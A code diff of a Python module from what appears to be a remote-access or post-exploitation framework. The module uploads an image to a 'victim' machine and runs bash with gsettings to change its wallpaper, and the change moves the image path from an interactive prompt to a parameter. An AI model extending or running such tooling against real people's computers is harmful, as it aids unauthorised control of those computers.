@@ -5,13 +5,16 @@ import misc.coloredstatus as cs
 from time import sleep
 import os
 
-def execute(session, configs):
-    if session.which("gsettings") == None:
-        print(cs.error, "Victim does not have dependency: gsettings")
+def execute(session, configs, params):
+    if params == None:
+        print(cs.status, "Usage: wallpaper [image location]")
         return 1
 
-    image = input(cs.status + " Enter the location of the image: ")
-    session.upload_file(image, "/tmp/wallpaper")
+    if session.which("gsettings") == None:
+        print(cs.error, "Victim does not have dependency: gsettings")
+        return 2
+
+    session.upload_file(params, "/tmp/wallpaper")
 
     shell = session.process("/bin/bash")
     print(cs.status, "Changing wallpaper...")
@@ -23,4 +26,4 @@ def execute(session, configs):
     else:
         print(cs.error, "Failed to change wallpaper")
         shell.close()
-        return 1
+        return 2
